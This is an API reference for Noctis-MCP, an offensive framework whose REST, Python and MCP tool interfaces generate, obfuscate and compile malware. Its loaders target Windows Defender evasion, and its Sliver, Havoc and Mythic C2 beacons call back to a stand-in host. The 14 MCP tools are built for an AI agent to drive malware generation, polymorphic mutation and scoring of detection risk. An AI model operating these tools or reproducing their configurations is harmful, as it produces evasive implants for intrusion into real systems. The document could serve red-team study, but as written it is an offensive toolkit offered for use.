# API Reference

Complete API documentation for Noctis-MCP.

## Table of Contents

1. [REST API](#rest-api)
2. [Python API](#python-api)
3. [MCP Tools](#mcp-tools)
4. [Configuration Objects](#configuration-objects)

---

## REST API

Base URL: `http://localhost:5000`

### Server Information

#### GET /api/stats

Get server statistics and status.

**Response:**
```json
{
  "status": "online",
  "version": "1.0.0",
  "techniques": 126,
  "compilers": ["mingw"],
  "c2_frameworks": ["sliver", "havoc", "mythic"],
  "platform": "Linux"
}
```

---

### Technique Management

#### GET /api/techniques

Query available techniques.

**Parameters:**
- `category` (optional): Filter by category
- `mitre_ttp` (optional): Filter by MITRE ATT&CK TTP
- `search` (optional): Search by keyword

**Response:**
```json
{
  "success": true,
  "techniques": [
    {
      "technique_id": "NOCTIS-T124",
      "name": "Indirect Syscalls (HellsHall)",
      "category": "syscalls",
      "mitre_attack": ["T1055", "T1106"],
      "opsec": {
        "detection_risk": "low",
        "stability": "high"
      }
    }
  ]
}
```

#### GET /api/techniques/{id}

Get detailed information about a specific technique.

**Response:**
```json
{
  "success": true,
  "technique": {
    "technique_id": "NOCTIS-T124",
    "name": "Indirect Syscalls (HellsHall)",
    "category": "syscalls",
    "source_files": ["Examples/MaldevAcademy/.../HellsHall.c"],
    "functions": ["HellsHallInitialize", "HellDescent"],
    "dependencies": ["ntdll.dll"],
    "compatible_with": ["api_hashing", "encryption"],
    "incompatible_with": [],
    "opsec": {
      "detection_risk": "low",
      "stability": "high",
      "tested_on": ["Win10 21H2", "Win11 22H2"]
    }
  }
}
```

---

### Code Generation

#### POST /api/generate

Generate malware code from techniques.

**Request:**
```json
{
  "techniques": ["NOCTIS-T124", "NOCTIS-T118"],
  "target_os": "Windows 11",
  "target_av": "Windows Defender",
  "obfuscate": true
}
```

**Response:**
```json
{
  "success": true,
  "code": "/* Generated malware code */\n#include <windows.h>\n...",
  "techniques_applied": ["NOCTIS-T124", "NOCTIS-T118"],
  "files": {
    "main.c": "...",
    "common.h": "..."
  },
  "generation_time": 0.5
}
```

---

### Compilation

#### POST /api/compile

Compile C/C++ code to executable.

**Request:**
```json
{
  "source_code": "#include <windows.h>\nint main() { ... }",
  "architecture": "x64",
  "optimization": "O2",
  "output_name": "loader",
  "subsystem": "windows"
}
```

**Parameters:**
- `source_code` (required): C/C++ source code
- `architecture` (optional): `x64` or `x86` (default: `x64`)
- `optimization` (optional): `O0`, `O1`, `O2`, `O3` (default: `O2`)
- `output_name` (optional): Output filename (default: `payload`)
- `subsystem` (optional): `console` or `windows` (default: `console`)

**Response:**
```json
{
  "success": true,
  "binary_path": "compiled/loader.exe",
  "size": 32768,
  "compilation_time": 2.3,
  "architecture": "x64",
  "compiler": "mingw"
}
```

---

### OPSEC Analysis

#### POST /api/analyze/opsec

Analyze binary for OPSEC issues.

**Request:**
```json
{
  "binary_path": "compiled/loader.exe"
}
```

**Response:**
```json
{
  "success": true,
  "score": 8.5,
  "issues": [
    {
      "severity": "medium",
      "type": "suspicious_string",
      "description": "String 'VirtualAlloc' found at offset 0x1000",
      "recommendation": "Apply API hashing to hide API name"
    }
  ],
  "recommendations": [
    "Enable string encryption",
    "Use API hashing for memory APIs",
    "Consider polymorphic code generation"
  ]
}
```

---

### C2 Integration

#### POST /api/c2/sliver/generate

Generate Sliver C2 beacon.

**Request:**
```json
{
  "listener_host": "c2.example.com",
  "listener_port": 443,
  "protocol": "https",
  "architecture": "x64",
  "techniques": ["NOCTIS-T124"],
  "obfuscate": true
}
```

**Response:**
```json
{
  "success": true,
  "beacon_path": "compiled/sliver_beacon.exe",
  "shellcode_path": "compiled/sliver_beacon.bin",
  "beacon_size": 156288,
  "opsec_score": 8.9,
  "techniques_applied": ["NOCTIS-T124", "NOCTIS-T118"],
  "compilation_time": 3.2
}
```

#### POST /api/c2/havoc/generate

Generate Havoc C2 demon.

**Request:**
```json
{
  "listener_host": "c2.example.com",
  "listener_port": 443,
  "protocol": "https",
  "architecture": "x64",
  "sleep_technique": "Ekko",
  "techniques": ["NOCTIS-T124"],
  "obfuscate": true,
  "indirect_syscalls": true,
  "stack_duplication": true
}
```

**Response:**
```json
{
  "success": true,
  "beacon_path": "compiled/havoc_demon.exe",
  "shellcode_path": "compiled/havoc_demon.bin",
  "beacon_size": 172544,
  "opsec_score": 9.2,
  "techniques_applied": ["NOCTIS-T124", "NOCTIS-T118"],
  "compilation_time": 3.8,
  "sleep_technique": "Ekko",
  "evasion_features": {
    "indirect_syscalls": true,
    "stack_duplication": true
  }
}
```

#### POST /api/c2/mythic/generate

Generate Mythic C2 agent.

**Request:**
```json
{
  "listener_host": "c2.example.com",
  "listener_port": 80,
  "agent_type": "apollo",
  "c2_profile": "http",
  "architecture": "x64",
  "api_token": "your_mythic_api_token",
  "techniques": ["NOCTIS-T124"],
  "obfuscate": true
}
```

**Response:**
```json
{
  "success": true,
  "beacon_path": "compiled/mythic_apollo.exe",
  "shellcode_path": "compiled/mythic_apollo.bin",
  "beacon_size": 245760,
  "opsec_score": 8.7,
  "techniques_applied": ["NOCTIS-T124"],
  "compilation_time": 4.1,
  "agent_type": "apollo",
  "c2_profile": "http"
}
```

#### GET /api/c2/frameworks

List all supported C2 frameworks.

**Response:**
```json
{
  "success": true,
  "frameworks": [
    {
      "name": "Sliver",
      "status": "implemented",
      "protocols": ["https", "http", "dns", "tcp", "mtls"],
      "architectures": ["x64", "x86"],
      "formats": ["shellcode", "exe", "dll"]
    },
    {
      "name": "Havoc",
      "status": "implemented",
      "protocols": ["https", "http", "smb"],
      "architectures": ["x64", "x86"],
      "formats": ["shellcode", "exe", "dll"]
    },
    {
      "name": "Mythic",
      "status": "implemented",
      "protocols": ["https", "http", "websocket", "dns", "smb"],
      "architectures": ["x64", "x86", "arm64"],
      "formats": ["exe", "dll", "shellcode", "service_exe"]
    }
  ]
}
```

---

## Python API

### Technique Management

```python
from server.technique_engine import TechniqueEngine

# Initialize engine
engine = TechniqueEngine(technique_dir='techniques/metadata')

# Query techniques
techniques = engine.query_techniques(category='api_hashing')

# Get technique details
tech = engine.get_technique('NOCTIS-T124')
print(tech.name)
print(tech.opsec)
```

### Code Assembly

```python
from server.code_assembler import CodeAssembler

# Initialize assembler
assembler = CodeAssembler()

# Assemble code from techniques
code = assembler.assemble(
    technique_ids=['NOCTIS-T124', 'NOCTIS-T118'],
    include_main=True
)

print(code)
```

### Compilation

```python
from compilation import get_compiler

# Get platform-appropriate compiler
compiler = get_compiler(output_dir='compiled')

# Compile code
result = compiler.compile(
    source_code=code,
    architecture='x64',
    optimization='O2',
    output_name='loader',
    subsystem='windows'
)

if result['success']:
    print(f"Binary: {result['binary_path']}")
    print(f"Size: {result['size']} bytes")
else:
    print(f"Error: {result['error']}")
```

### Obfuscation

#### String Encryption

```python
from server.obfuscation.string_encryption import StringEncryptor

# Initialize encryptor
encryptor = StringEncryptor(method='aes')

# Encrypt strings
encrypted_code = encryptor.encrypt_code(source_code)
```

**Methods:**
- `xor` - XOR encryption
- `aes` - AES-256 encryption
- `rc4` - RC4 encryption

#### API Hashing

```python
from server.obfuscation.api_hashing import APIHasher

# Initialize hasher
hasher = APIHasher(algorithm='djb2')

# Hash API calls
hashed_code = hasher.hash_apis(source_code)
```

**Algorithms:**
- `djb2` - DJB2 hash algorithm
- `rot13xor` - ROT13 + XOR
- `crc32` - CRC32 hash

#### Control Flow

```python
from server.obfuscation.control_flow import ControlFlowObfuscator

# Initialize obfuscator
obf = ControlFlowObfuscator()

# Flatten control flow
flattened = obf.flatten(source_code, complexity='high')

# Add junk code
with_junk = obf.insert_junk_code(source_code, density='medium')
```

#### Polymorphic Engine

```python
from server.polymorphic.engine import PolymorphicEngine

# Initialize engine
engine = PolymorphicEngine()

# Generate variant
variant, stats = engine.generate_variant(
    source_code=code,
    mutation_level='high'
)

print(f"Mutations: {stats}")
```

**Mutation Levels:**
- `low` - 10-20% different
- `medium` - 30-50% different
- `high` - 60-80% different

### OPSEC Analysis

```python
from server.opsec_analyzer import OPSECAnalyzer

# Initialize analyzer
analyzer = OPSECAnalyzer()

# Analyze binary
result = analyzer.analyze(binary_path='compiled/loader.exe')

print(f"Score: {result['score']}/10")
for issue in result['issues']:
    print(f"- [{issue['severity']}] {issue['description']}")
```

### C2 Adapters

#### Sliver

```python
from c2_adapters import generate_sliver_beacon
from c2_adapters.config import SliverConfig, Protocol, Architecture

# Method 1: Simple
result = generate_sliver_beacon(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    techniques=["NOCTIS-T124"],
    obfuscate=True
)

# Method 2: With config object
config = SliverConfig(
    listener_host="c2.example.com",
    listener_port=443,
    protocol=Protocol.HTTPS,
    architecture=Architecture.X64,
    beacon_interval=60,
    beacon_jitter=30
)

from c2_adapters.sliver_adapter import SliverAdapter
adapter = SliverAdapter(config)
result = adapter.generate_beacon(
    techniques=["NOCTIS-T124"],
    obfuscate=True
)

if result.success:
    print(f"Beacon: {result.beacon_path}")
    print(f"OPSEC: {result.opsec_score}/10")
```

#### Havoc

```python
from c2_adapters import generate_havoc_demon
from c2_adapters.config import HavocConfig

# Method 1: Simple
result = generate_havoc_demon(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    sleep_technique="Ekko",
    indirect_syscalls=True,
    stack_duplication=True,
    techniques=["NOCTIS-T124"],
    obfuscate=True
)

# Method 2: With config object
config = HavocConfig(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    sleep_technique="Ekko",
    sleep_mask=True,
    indirect_syscalls=True,
    stack_duplication=True
)

from c2_adapters.havoc_adapter import HavocAdapter
adapter = HavocAdapter(config)
result = adapter.generate_beacon(
    techniques=["NOCTIS-T124"],
    obfuscate=True
)
```

#### Mythic

```python
from c2_adapters import generate_mythic_agent
from c2_adapters.config import MythicConfig

# Method 1: Simple
result = generate_mythic_agent(
    listener_host="c2.example.com",
    listener_port=80,
    agent_type="apollo",
    c2_profile="http",
    api_token="your_api_token",
    techniques=["NOCTIS-T124"],
    obfuscate=True
)

# Method 2: With config object
config = MythicConfig(
    listener_host="c2.example.com",
    listener_port=80,
    protocol="http",
    payload_type="apollo",
    c2_profile="http",
    api_key="your_api_token"
)

from c2_adapters.mythic_adapter import MythicAdapter
adapter = MythicAdapter(config, api_token="your_api_token")
result = adapter.generate_beacon(
    techniques=["NOCTIS-T124"],
    obfuscate=True
)
```

---

## MCP Tools

14 tools available for AI interaction via Model Context Protocol.

### query_techniques

Query technique database.

```python
@mcp.tool()
def query_techniques(
    category: Optional[str] = None,
    mitre_ttp: Optional[str] = None,
    search: Optional[str] = None
) -> str
```

### get_technique_details

Get detailed information about a specific technique.

```python
@mcp.tool()
def get_technique_details(technique_id: str) -> str
```

### generate_malware

Generate malware code from techniques.

```python
@mcp.tool()
def generate_malware(
    techniques: List[str],
    target_os: str = "Windows 10",
    target_av: Optional[str] = None,
    payload_type: str = "loader",
    architecture: str = "x64",
    obfuscate_strings: bool = False,
    obfuscate_apis: bool = False
) -> str
```

### compile_code

Compile code to executable.

```python
@mcp.tool()
def compile_code(
    source_code: str,
    architecture: str = "x64",
    optimization: str = "O2",
    output_name: str = "payload"
) -> str
```

### analyze_opsec

Analyze binary for OPSEC issues.

```python
@mcp.tool()
def analyze_opsec(binary_path: str) -> str
```

### generate_sliver_beacon

Generate Sliver C2 beacon.

```python
@mcp.tool()
def generate_sliver_beacon(
    listener_host: str,
    listener_port: int,
    protocol: str = "https",
    architecture: str = "x64",
    techniques: Optional[List[str]] = None,
    obfuscate: bool = True
) -> str
```

### generate_havoc_demon

Generate Havoc C2 demon.

```python
@mcp.tool()
def generate_havoc_demon(
    listener_host: str,
    listener_port: int,
    protocol: str = "https",
    architecture: str = "x64",
    sleep_technique: str = "Ekko",
    techniques: Optional[List[str]] = None,
    obfuscate: bool = True,
    indirect_syscalls: bool = True,
    stack_duplication: bool = True
) -> str
```

### generate_mythic_agent

Generate Mythic C2 agent.

```python
@mcp.tool()
def generate_mythic_agent(
    listener_host: str,
    listener_port: int,
    api_token: str,
    agent_type: str = "apollo",
    c2_profile: str = "http",
    architecture: str = "x64",
    techniques: Optional[List[str]] = None,
    obfuscate: bool = True
) -> str
```

### list_c2_frameworks

List all supported C2 frameworks.

```python
@mcp.tool()
def list_c2_frameworks() -> str
```

### get_c2_framework_info

Get detailed information about a C2 framework.

```python
@mcp.tool()
def get_c2_framework_info(framework_name: str) -> str
```

---

## Configuration Objects

### Architecture Enum

```python
from c2_adapters.config import Architecture

Architecture.X64  # 64-bit
Architecture.X86  # 32-bit
Architecture.ARM64  # ARM 64-bit
```

### Protocol Enum

```python
from c2_adapters.config import Protocol

Protocol.HTTPS
Protocol.HTTP
Protocol.DNS
Protocol.TCP
Protocol.MTLS
Protocol.SMB
Protocol.WEBSOCKET
```

### OutputFormat Enum

```python
from c2_adapters.config import OutputFormat

OutputFormat.EXE
OutputFormat.DLL
OutputFormat.SHELLCODE
OutputFormat.SERVICE_EXE
```

### SliverConfig

```python
@dataclass
class SliverConfig(C2Config):
    beacon_interval: int = 60  # seconds
    beacon_jitter: int = 30  # percent
    max_connection_errors: int = 3
    reconnect_interval: int = 5  # seconds
    skip_tls_verify: bool = False
```

### HavocConfig

```python
@dataclass
class HavocConfig(C2Config):
    sleep_technique: str = "Ekko"  # Ekko, Foliage, WaitForSingleObjectEx
    sleep_mask: bool = True
    indirect_syscalls: bool = True
    stack_duplication: bool = True
    proxy_loading: bool = False
    encryption_key: Optional[str] = None
    encryption_type: str = "aes256"
```

### MythicConfig

```python
@dataclass
class MythicConfig(C2Config):
    mythic_host: str = "127.0.0.1"
    mythic_port: int = 7443
    api_key: str = ""
    payload_type: str = "apollo"  # apollo, merlin, poseidon, etc.
    c2_profile: str = "http"
    callback_host: Optional[str] = None
    callback_port: Optional[int] = None
    build_parameters: Dict[str, Any] = field(default_factory=dict)
    commands: List[str] = field(default_factory=list)
    encrypted_exchange_check: bool = True
    crypto_type: str = "aes256_hmac"
```

---

## Error Handling

### HTTP Status Codes

- `200 OK` - Request successful
- `400 Bad Request` - Invalid parameters
- `404 Not Found` - Resource not found
- `500 Internal Server Error` - Server error

### Error Response Format

```json
{
  "success": false,
  "error": "Error message",
  "details": "Detailed error information"
}
```

### Python Exceptions

```python
from c2_adapters.base_adapter import C2AdapterException

try:
    result = generate_sliver_beacon(...)
except C2AdapterException as e:
    print(f"C2 error: {e}")
except CompilationException as e:
    print(f"Compilation error: {e}")
```

---

**Last Updated**: October 3, 2025  
**Version**: 1.0.0

